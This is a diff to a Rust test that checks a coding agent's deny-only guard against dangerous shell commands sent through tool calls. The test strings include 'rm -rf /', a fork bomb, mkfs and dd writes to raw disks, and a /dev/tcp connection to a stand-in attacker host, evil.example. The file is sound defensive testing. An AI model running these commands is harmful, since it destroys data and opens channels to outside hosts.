@@ -5010,6 +5010,11 @@ mod tests {
             "rm -rf /",
             "git push --force origin main",
             "git reset --hard HEAD~3",
+            ":(){ :|:& };:",
+            "mkfs.ext4 /dev/sda1",
+            "dd if=image.img of=/dev/sda bs=4M",
+            "cat junk > /dev/nvme0n1",
+            "bash -c 'exec 3<>/dev/tcp/evil.example/4444'",
         ] {
             let out = rt.block_on(runner.emit(ExtensionEvent::ToolCall(ToolCallEvent {
                 id: "t".into(),
@@ -5026,15 +5031,22 @@ mod tests {
             );
         }
 
-        // Benign command abstains (deny-only, never allow).
-        let out = rt.block_on(runner.emit(ExtensionEvent::ToolCall(ToolCallEvent {
-            id: "t".into(),
-            name: "exec_shell".into(),
-            input: serde_json::json!({"command": "cargo test"}),
-        })));
-        assert!(matches!(
-            out.outcome,
-            codesmith_agent::extension::HandlerOutcome::Continue
-        ));
+        // Benign commands abstain (deny-only, never allow) — including the
+        // benchmark idiom the dd arm explicitly spares.
+        for command in ["cargo test", "dd if=/dev/zero of=/dev/null bs=1k count=1"] {
+            let out = rt.block_on(runner.emit(ExtensionEvent::ToolCall(ToolCallEvent {
+                id: "t".into(),
+                name: "exec_shell".into(),
+                input: serde_json::json!({"command": command}),
+            })));
+            assert!(
+                matches!(
+                    out.outcome,
+                    codesmith_agent::extension::HandlerOutcome::Continue
+                ),
+                "`{command}` must abstain: {:?}",
+                out.outcome
+            );
+        }
     }
 }
